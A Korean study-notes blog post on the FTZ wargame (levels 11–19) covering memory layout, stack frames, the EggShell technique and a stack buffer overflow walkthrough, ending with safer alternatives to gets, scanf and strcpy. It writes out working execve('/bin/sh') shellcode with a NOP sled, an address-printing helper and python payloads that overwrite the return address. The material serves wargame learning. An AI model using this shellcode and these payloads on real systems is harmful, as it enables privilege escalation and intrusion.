## FTZ level11~19 풀면서 공부한 것 (문제풀이 아님)

--------------------------------------------




### 01 메모리 구조 

FTZ는 bof와 fsb를 공부하기 위한 문제들로 구성되어있기 때문에 메모리 구조에 대해 알아야 할 필요가 있다. 

우선 다음의 그림을 가볍게 보고 넘어가도록 하자. 

(주솟값을 기준으로 영역의 배치 순서와 어느 영역에 무엇이 저장되는지 정도를 보면 된다. 

아래 그림은 메모리가 4GB일 때를 가정한 상황이다. ) 

![default](https://user-images.githubusercontent.com/40850499/43872149-31ae1a1a-9bbb-11e8-8e04-9ce536f78398.png)

메모리 구조는 낮은 주소를 위쪽으로 놓았을 때를 기준으로 CODE, DATA, HEAP, STACK 영역으로 구분된다.  

각 영역마다 들어가는 값은 위 그림을 참고하자. 




level11~19는 버퍼오버플로우 중에서도 스택 버퍼오버플로우에 관련된 문제들이기때문에 아래에서 스택에 대해 더 알아보자.  




### 02 함수 호출 시 메모리의 상황 변화 ; 스택 프레임




우선 스택 프레임의 개념을 알고 가자.

#### * 스택 프레임(stack frame) 이란 ? 

메모리의 스택(stack) 영역은 함수의 호출과 관계되는 매개 변수와 지역 변수가 저장되는 영역이다.

스택 영역은 함수의 호출과 함께 할당되며, 함수의 호출이 완료되면 소멸한다. 

 
 

함수가 호출되면 스택에는 (메모리의 높은 주소부터 차례로) 함수의 매개변수, 호출이 끝난 뒤 돌아갈 반환 주소값, 함수에서 선언된 지역 변수 등이 저장된다.

이렇게 **스택 영역에 차례대로 저장되는 함수의 호출 정보**를 스택 프레임(stack frame)이라고 한다.

이러한 스택 프레임 덕분에 **함수의 호출이 모두 끝난 뒤에, 해당 함수가 호출되기 이전 상태로 되돌아갈 수 있다.**




우선 스택 프레임의 동작 방식을 알아보자. 

예를 들어 다음과 같은 소스가 있다고 하면,

![default](https://user-images.githubusercontent.com/40850499/43872176-45f71ae4-9bbb-11e8-807f-bcfb85575aa9.JPG)






다음 그림은 위 예제 코드에서 함수 호출에 의한 스택 프레임의 변화를 보여주고 있다. 
![default](https://user-images.githubusercontent.com/40850499/43872169-40d5457c-9bbb-11e8-8635-ba2b21549fe7.JPG)
![2](https://user-images.githubusercontent.com/40850499/43872170-42d30aa8-9bbb-11e8-9bd4-2a8d31238fbe.JPG)


Step 1. 프로그램이 실행되면, 가장 먼저 main() 함수가 호출되어 main() 함수의 스택 프레임이 스택에 저장된다.

Step 2. func1() 함수를 호출하면 해당 함수의 매개변수, 반환 주소값, 지역 변수 등의 스택 프레임이 스택에 저장된다.

Step 3. func2() 함수를 호출하면 해당 함수의 스택 프레임이 추가로 스택에 저장된다.

Step 4. func2() 함수의 모든 작업이 완료되어 반환되면, func2() 함수의 스택 프레임만이 스택에서 제거된다.

Step 5. func1() 함수의 호출이 종료되면, func1() 함수의 스택 프레임이 스택에서 제거된다.

Step 6. main() 함수의 모든 작업이 완료되면, main() 함수의 스택 프레임이 스택에서 제거되면서 프로그램이 종료된다.


 

이처럼 스택은 가장 나중에 저장된 데이터가 가장 먼저 인출되는 방식으로 동작한다.

이러한 방식을 후입선출(LIFO, Last-In First-Out) 방식이라고 한다. 

이때 스택은 푸시(push) 동작으로 데이터를 저장하고, 팝(pop) 동작으로 데이터를 인출한다. 




스택이 메모리상에서 LIFO구조로(거꾸로) 자라는 이유는  다음 그림에서 보이는 커널영역을 침범하지 않게 하기 위해서이다. 

![default](https://user-images.githubusercontent.com/40850499/43872149-31ae1a1a-9bbb-11e8-8e04-9ce536f78398.png)

 커널영역은 운영체제를 실행시키기 위해서 필요한 메모리 공간으로, 시스템을 운영하고 관리하는데 중요한 정보들이 있기때문에 유저 영역에서 실행 중인 프로그램이 커널 영역으로 접근을 시도하면 시스템에서 오류가 발생했음을 알리고 접근을 원천적으로 봉쇄한다. 




#### * 스택 오버플로우(Stack OverFlow)

만약 재귀 호출이 무한히 반복되면, 위 그림에서 Step 3 이후로는 재귀 호출에 의한 스택 프레임이 계속해서 쌓여만 갈 것이다.

이렇게 스택의 모든 공간을 다 차지하고 난 후 더 이상의 여유 공간이 없을 때 또 다시 스택 프레임을 저장하면 데이터는 스택 영역을 넘어가서 저장되고, 다른 메모리 공간의 데이터를 덮어 씌울 수 있기때문에 프로그램이 오동작을 하거나 보안상의 큰 취약점을 가지게 된다.

![3](https://user-images.githubusercontent.com/40850499/43872172-4499441a-9bbb-11e8-98a9-31c73b7a78d7.JPG)

C언어에서는 실행 중인 프로그램에서 스택 오버플로우가 발생하면, 에러를 발생하고 곧바로 강제 종료시킨다. 




### 03 에그쉘(EggShell) ; 쉘코드와 환경변수




#### * 에그쉘(EggShell)이란 ?

ret 주소에 쉘코드를 직접 넣는게 아니라 쉘코드를 환경변수에 등록해놓고 그 ret 주소에 쉘코드의 주솟값을 적음으로써 return이 쉘로 가게 만드는 방법이다.  

BOF에서는 버퍼의 크기가 쉘코드의 크기보다 작아서 쉘코드를 써넣을 수 없을 때 환경변수에 쉘을 등록해놓고 그 주솟값만 가져와서 쉘을 띄울 수 있게 해주는 것이다.  

즉, 기계어로 만든 코드를 메모리에 로드시키고 그시작주소를 알려주는 일종의 툴이라고 할 수 있다.




환경변수가 쉘코드를 감싸고 있는 느낌(like계란껍질)이라 에그쉘이라는 이름이 붙었다. 

(쉘코드, 환경변수 등 처음 듣는 단어가 많아서 아직 이해하기 어려울수도 있으니까 아래의 설명을 읽고 다시 보면 이해가 될 것이다.)  




#### * 쉘코드(ShellCode)란 ?

**shellCode**는 "**/bin/bash**"나 "**/bin/sh**"를 실행시켜주는 코드이다. 

이 코드는 C로 소스를 만들고 약간의 가공을 거쳐서 기계어로 만들어진 결과물을 16진수의 코드로 사용하는 것이다. 

결과적으로 이야기하자면 쉘의 호출이 실행 가능한 프로그램을 코드로 만들어 필요할 때 호출하는 것이다. 

이것을 호출하는 방법은 다양하지만 이번에는 사용할 shellCode를 구글링해서 하나 빌려오도록 하자. 

(25바이트 길이의 쉘코드를 가져왔다.)




#### * 환경변수란 ? 

프로세스가 컴퓨터에서 동작하는 방식에 영향을 미치는 동적인 값들의 모임이다. 

쉽게 말하자면 사용자가 자주 사용하는 정보를 저장하여 이용하기 편리하게 해주는 것이다.  

// printenv 명령어를 통해 현재 설정되어있는 환경변수들을 출력해볼 수 있다.




그럼 이제 문제풀이 흐름을 따라가보자. 

우선 export 명령어를 통해 25바이트짜리 쉘코드를 환경변수로 등록해주고 (이름은 간단히 SHELL로 지음)

> export SHELL=`python -c 'print "\x90"*90+ "\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"'`




임시 저장 디렉터리(tmp)에서 vi편집기로 아래 소스를 입력, 저장하고 나온다. 

//난 파일 이름을 egg.c로  저장했다.

(코딩을 하기 전 편집기에서 " :set paste -> i " 를 해주면 자동으로 들여쓰기가 돼서 편리하다.)

> #include <stdio.h>
>
> int main(){
> 	printf("SHELLCODE addr is %p\n", getenv("SHELL"));
> 	return 0;
> }

이것은 환경변수의 주소를 불러오는 소스이다. 앞서 쉘코드를 환경변수로 등록했기 때문에 이 파일을 컴파일한 뒤 실행하면 쉘 주솟값이 출력된다.  

컴파일 및 파일 실행은 다음과 같이 할 수 있다. 

> $ gcc -o egg egg.c 
>
> $ ./egg

그럼 다음과 같은 쉘 주솟값을 얻을 수 있다 ! 

> $ SHELLCODE addr is 0xbffffc5b




=> 이제 쉘의 주솟값을 알았으니, 문제에서 주어진 스택의 상황을 계산&게싱하여 ret주소에 쉘 주솟값을 덮어씌워버리면 현재 함수가 호출 종료될 때 쉘을 얻어낼 수 있다 !!  




### 04 Let's BOF! 

=> gdb로 메모리(스택) 주소값을 읽어내거나/ 더미값을 게싱해서 메모리 상태를 파악한다. 

​	//gdb 사용법은 아직 익히는 중입니다. 어셈 읽는거랑 주솟값 보는법 넘모 어려워요 ㅜㅜ 

=> 페이로드 작성 ; bof를 일으켜 쉘 주소를 RET에 삽입한다.  (전 파이썬 사용) 

예) 버퍼 256byte + 더미 4 + SFP 4 + RET 4 이고, 쉘 주솟값이  0xbffffc5b일 때 

①  인자값 넘기는 방식

> $ ./<공격할 파일명> $(python -c 'print "A"*264 + "\x5b\xfc\xff\xbf"')

② 입력값 받는 방식

> $ (python -c 'print "A"*264 + "\x5b\xfc\xff\xbf"'; cat) | ./<공격할 파일명> 
>
> $ 값 입력하기

=> 공격 성공 !! /실패한 경우 값을 바꿔가며 재시도 !!!




### 05 BOF에 취약한 함수와 올바른 사용법

**1) gets** ; gets(char *s) 는 엔터가 입력될 때까지 입력된 문자열을 버퍼에 저장한다. 

문자열을 입력받지만 문자열을 담을 공간의 길이와 입력받은 문자열의 길이를 확인하지 않기 때문에 bof 발생

 => 추천하는 방법은 fgets 함수를 사용하는 것이다. 

> fgets(char *s, int n, FILE *stream) 




**2) scanf** scanf(const char *format, …) 는 데이터를 입력받는 함수로 엔터가 입력될 때까지 입력을 받는다. 공백 문자 없이 문자열을 입력하게 되면 gets 함수처럼 입력받은 문자열의 길이를 체크하지 않기 때문에 스택의 값이 변조될 수가 있다. 그래서 사용할 때 변환 명세에 **(버퍼 크기 – 1)**만큼의 옵션을 주면 된다.  

예)

> \#include <stdio.h>
>
> int main()
>
> {
>
> ​           char buf[10];
>
> ​           scanf(“%**9**s”, buf);
>
> ​           printf(“buf: %s\n”, buf);
>
> }




**3) strcpy** strcpy(char *dest, const char *src)는 src 의 내용을 dest에 복사한다. 

> => strncpy(char *dest, cont char *src, size_t maxlen) 를 사용. 
>
> //maxlen 은 복사할 크기를 지정해 주는 것이다.




*참고자료 

- 여동기. 『문제 풀이로 배우는 시스템 해킹 테크닉』. 위키북스, 2015.

- 우스이 토시노리 외 7인. 『CTF 정보보안 콘테스트 챌린지 북』. 위키북스, 2016.

- 스택 프레임(Stack Frame) 그림 및 설명 출처 

  http://tcpschool.com/c/c_memory_stackframe

- BOF에 취약한 함수와 올바른 사용법

  https://blog.naver.com/mdstec_auto 
